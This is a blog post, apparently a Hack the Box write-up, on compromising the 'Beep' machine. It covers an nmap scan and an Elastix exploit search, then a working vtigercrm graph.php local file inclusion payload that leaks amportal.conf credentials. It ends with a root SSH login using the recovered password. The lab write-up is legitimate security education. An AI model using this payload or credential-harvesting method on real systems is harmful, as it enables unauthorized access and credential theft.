@@ -1,0 +1,204 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="LogistyxCat, Blog of a security student.">
+
+        <link rel="alternate"  href="https://logistyxcat.github.io/feeds/all.atom.xml" type="application/atom+xml" title="LogistyxCat Full Atom Feed"/>
+
+        <title>Beep - Hack the Box // LogistyxCat // Blog of a security student.</title>
+
+
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.3.0/pure-min.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="./theme/css/pure.css">
+    <link rel="stylesheet" href="./theme/css/pygments.css">
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/fitvids/1.0.1/jquery.fitvids.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $(".content").fitVids();
+        });
+    </script>
+</head>
+
+<body>
+<div class="pure-g-r" id="layout">
+    <div class="sidebar sidebar-article pure-u">
+        <header class="header-article">
+            <hgroup>
+                <a href="./author/riley.html" title="See posts by Riley">
+                </a>
+                <h2 class="article-info">Riley</h2>
+                <small class="about-author"></small>
+                <h5>Published</h5>
+                <p>Sun 26 April 2020</p>
+                <a href="/">&larr;Home</a>
+            </hgroup>
+        </header>
+    </div>
+    <div class="pure-u">
+        <div class="content">
+            <section class="post">
+                <header class="post-header">
+                    <h1>Beep - Hack the Box</h1>
+                        <p class="post-meta">
+                            // under                                 <a class="post-category" href="./tag/ctf.html">ctf</a>
+                                <a class="post-category" href="./tag/hack-the-box.html">hack the box</a>
+                                <a class="post-category" href="./tag/oscp-prep.html">oscp prep</a>
+                        </p>
+                </header>
+            </section>
+            <h2>Description</h2>
+<p>Beep is a very straightforward Unix box featuring LFI web app exploit.  The path goes pretty much straight to root.</p>
+<h2>Reconnaissance</h2>
+<p>To start, we should see what services are available on this box.</p>
+<p><strong>Nmap scan</strong></p>
+<div class="highlight"><pre><span></span><span class="c1"># nmap -Pn -oA nmap/beep -sV -sC 10.10.10.7</span>
+Starting Nmap <span class="m">7</span>.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at <span class="m">2020</span>-04-26 <span class="m">14</span>:01 PDT
+Nmap scan report <span class="k">for</span> <span class="m">10</span>.10.10.7
+Host is up <span class="o">(</span><span class="m">0</span>.12s latency<span class="o">)</span>.
+Not shown: <span class="m">988</span> closed ports
+PORT      STATE SERVICE    VERSION
+<span class="m">22</span>/tcp    open  ssh        OpenSSH <span class="m">4</span>.3 <span class="o">(</span>protocol <span class="m">2</span>.0<span class="o">)</span>
+<span class="m">25</span>/tcp    open  smtp       Postfix smtpd
+<span class="m">80</span>/tcp    open  http       Apache httpd <span class="m">2</span>.2.3
+<span class="m">110</span>/tcp   open  pop3       Cyrus pop3d <span class="m">2</span>.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+<span class="m">111</span>/tcp   open  rpcbind    <span class="m">2</span> <span class="o">(</span>RPC <span class="c1">#100000)</span>
+<span class="m">143</span>/tcp   open  imap       Cyrus imapd <span class="m">2</span>.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+<span class="m">443</span>/tcp   open  ssl/https?
+<span class="m">993</span>/tcp   open  ssl/imap   Cyrus imapd
+<span class="m">995</span>/tcp   open  pop3       Cyrus pop3d
+<span class="m">3306</span>/tcp  open  mysql      MySQL <span class="o">(</span>unauthorized<span class="o">)</span>
+<span class="m">4445</span>/tcp  open  upnotifyp?
+<span class="m">10000</span>/tcp open  http       MiniServ <span class="m">1</span>.570 <span class="o">(</span>Webmin httpd<span class="o">)</span>
+Service Info: Hosts:  beep.localdomain, <span class="m">127</span>.0.0.1, example.com
+</pre></div>
+
+
+<p>There's a fair bit going on here, but a good place to start would be the HTTPS server on 443</p>
+<h3>Examining HTTPS/443: Elastix server</h3>
+<p>The server hosts an Elastix site.</p>
+<p><img alt="f0f956c6b2374e07b2536db4d175395c.png" src="images/ctf/htb/beep/f0f956c6b2374e07b2536db4d175395c.png"></p>
+<p>A quick <code>searchsploit</code> reveals several exploits to choose from, one of note that may work is an Local File Inclusion (LFI) vulnerability.</p>
+<div class="highlight"><pre><span></span><span class="c1"># searchsploit elastix</span>
+-------------------------------------------------------------------------------------------------------------------- ----------------------------------------│
+ Exploit Title                                                                                                      <span class="p">|</span>  Path                                  │
+                                                                                                                    <span class="p">|</span> <span class="o">(</span>/usr/share/exploitdb/<span class="o">)</span>                │
+-------------------------------------------------------------------------------------------------------------------- ----------------------------------------│
+Elastix - <span class="s1">&#39;page&#39;</span> Cross-Site Scripting                                                                               <span class="p">|</span> exploits/php/webapps/38078.py          │
+Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                             <span class="p">|</span> exploits/php/webapps/38544.txt         │
+Elastix <span class="m">2</span>.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                       <span class="p">|</span> exploits/php/webapps/34942.txt         │
+Elastix <span class="m">2</span>.2.0 - <span class="s1">&#39;graph.php&#39;</span> Local File Inclusion                                                                    <span class="p">|</span> exploits/php/webapps/37637.pl          │
+Elastix <span class="m">2</span>.x - Blind SQL Injection                                                                                   <span class="p">|</span> exploits/php/webapps/36305.txt         │
+Elastix &lt; <span class="m">2</span>.5 - PHP Code Injection                                                                                  <span class="p">|</span> exploits/php/webapps/38091.php         │
+FreePBX <span class="m">2</span>.10.0 / Elastix <span class="m">2</span>.2.0 - Remote Code Execution                                                              <span class="p">|</span> exploits/php/webapps/18650.py          │
+------------------------------------------------------------------------------------------------------------------- <span class="p">|</span> ---------------------------------------│
+</pre></div>
+
+
+<p>Exploiting an LFI would allow us to snoop on otherwise inaccessible files, such as configuration files.  In web apps, these usually contain sensitive data such as user account names and passwords; we could potentially use these to access another service (such as MySQL) or get access to the server itself.</p>
+<p>I couldn't exploit the server by running the exploit file, but there is a comment in the soruce code that indicates what file path was used; we should be able to copy and paste the value into a browser manually.</p>
+<div class="highlight"><pre><span></span><span class="c1">#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action</span>
+</pre></div>
+
+
+<p><img alt="272cfa5dfa134126a48c44c9e786bb4d.png" src="images/ctf/htb/beep/272cfa5dfa134126a48c44c9e786bb4d.png"></p>
+<p>The exploit worked!  This is a large text file, so it would be best to sort it using some bash utilities.  For this, I copy and pasted the the content into a new file <code>amportal.conf</code> manually.</p>
+<div class="highlight"><pre><span></span><span class="c1"># cat amportal.conf | tr &quot; &quot; &quot;\n&quot; | sort | uniq | grep USER</span>
+AMPDBUSER
+AMPDBUSER:
+AMPDBUSER/AMPDBPASS
+<span class="nv">AMPDBUSER</span><span class="o">=</span>asteriskuser
+AMPMGRUSER
+AMPMGRUSER:
+<span class="nv">AMPMGRUSER</span><span class="o">=</span>admin
+<span class="nv">ARI_ADMIN_USERNAME</span><span class="o">=</span>admin
+CDRDBUSER:
+USER
+
+<span class="c1"># cat amportal.conf | tr &quot; &quot; &quot;\n&quot; | sort | uniq | grep PASS                                                                          </span>
+AMPDBPASS:
+<span class="nv">AMPDBPASS</span><span class="o">=</span>amp109
+<span class="nv">AMPDBPASS</span><span class="o">=</span>jEhdIekWmdjE
+AMPDBUSER/AMPDBPASS
+AMPMGRPASS:
+<span class="c1">#AMPMGRPASS=amp111</span>
+<span class="nv">AMPMGRPASS</span><span class="o">=</span>jEhdIekWmdjE
+ARI_ADMIN_PASSWORD
+<span class="nv">ARI_ADMIN_PASSWORD</span><span class="o">=</span>jEhdIekWmdjE
+CDRDBPASS:
+FOPPASSWORD:
+<span class="nv">FOPPASSWORD</span><span class="o">=</span>jEhdIekWmdjE
+<span class="c1">#FOPPASSWORD=passw0rd</span>
+<span class="nv">localhost</span><span class="o">=(</span>root<span class="o">)</span>NOPASSWD:
+</pre></div>
+
+
+<h2>Getting root</h2>
+<p>We can quickly test the password <code>jEhdIekWmdjE</code> to see what we now have access to.  A good first target would be root on SSH.</p>
+<p><em>Note: I had to add the <code>-oKexAlgorithms=diffie-hellman-group-exchange-sha1</code> as SSH was giving an error <code>no matching key exchange method found</code>.</em></p>
+<div class="highlight"><pre><span></span><span class="c1"># ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1 root@10.10.10.7</span>
+The authenticity of host <span class="s1">&#39;10.10.10.7 (10.10.10.7)&#39;</span> can not be established.
+RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
+Are you sure you want to <span class="k">continue</span> connecting <span class="o">(</span>yes/no/<span class="o">[</span>fingerprint<span class="o">])</span>? yes
+Warning: Permanently added <span class="s1">&#39;10.10.10.7&#39;</span> <span class="o">(</span>RSA<span class="o">)</span> to the list of known hosts.
+root@10.10.10.7 password: jEhdIekWmdjE
+Last login: Tue Jul <span class="m">16</span> <span class="m">11</span>:45:47 <span class="m">2019</span>
+
+Welcome to Elastix 
+----------------------------------------------------
+
+To access your Elastix System, using a separate workstation <span class="o">(</span>PC/MAC/Linux<span class="o">)</span>
+Open the Internet Browser using the following URL:
+http://10.10.10.7
+
+<span class="o">[</span>root@beep ~<span class="o">]</span><span class="c1"># whoami &amp;&amp; hostname</span>
+root
+beep
+<span class="o">[</span>root@beep ~<span class="o">]</span><span class="c1"># wc -c root.txt</span>
+<span class="m">33</span> root.txt
+<span class="o">[</span>root@beep ~<span class="o">]</span><span class="c1">#</span>
+</pre></div>
+
+
+<p>The password lets us authenticate as root, giving us total control of the target server.</p>
+<p>Thus concludes this walkthrough.  Thank you for reading.</p>
+            <div class="hr"></div>
+            <a href="#" class="go-top">Go Top</a>
+<footer class="footer">
+    <p>&copy; LogistyxCat &ndash;
+        Built with <a href="https://github.com/PurePelicanTheme/pure">Pure Theme</a>
+        for <a href="http://blog.getpelican.com/">Pelican</a>
+    </p>
+</footer>        </div>
+    </div>
+</div>
+    <script>
+        var $top = $('.go-top');
+
+        // Show or hide the sticky footer button
+        $(window).scroll(function() {
+            if ($(this).scrollTop() > 200) {
+                $top.fadeIn(200);
+            } else {
+                $top.fadeOut(200);
+            }
+        });
+
+        // Animate the scroll to top
+        $top.click(function(event) {
+            event.preventDefault();
+            $('html, body').animate({scrollTop: 0}, 300);
+        })
+
+        // Makes sure that the href="#" attached to the <a> elements
+        // don't scroll you back up the page.
+        $('body').on('click', 'a[href="#"]', function(event) {
+            event.preventDefault();
+        });
+    </script>
+</body>
+</html>
